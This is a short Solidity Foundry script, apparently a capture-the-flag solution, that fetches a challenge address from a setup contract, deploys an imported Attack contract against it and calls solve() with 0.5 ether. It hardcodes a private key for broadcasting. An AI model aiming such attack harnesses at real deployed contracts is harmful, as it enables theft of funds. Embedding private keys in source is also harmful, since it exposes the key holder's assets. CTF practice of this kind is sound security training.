// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "forge-std/Script.sol";
import "../src/Attack.sol";

contract DeployAttack is Script {
    function run() external {
        uint256 privateKey = 0x3b10b1f7c8dc0f7daf47f36d410c14274a300ba410c675aacd62f876ccf5b977;
        address setupContract = 0x3A274E86694808F3f4d024532E7bcb6F328b84FE;
        vm.startBroadcast(privateKey);
        (bool success, bytes memory data) = setupContract.call(abi.encodeWithSignature("challenge()"));
        require(success, "Failed to get challenge address");
        address challengeAddress = abi.decode(data, (address));
        Attack attack = new Attack(challengeAddress);
        attack.solve{value: 0.5 ether}();
        vm.stopBroadcast();
    }
}
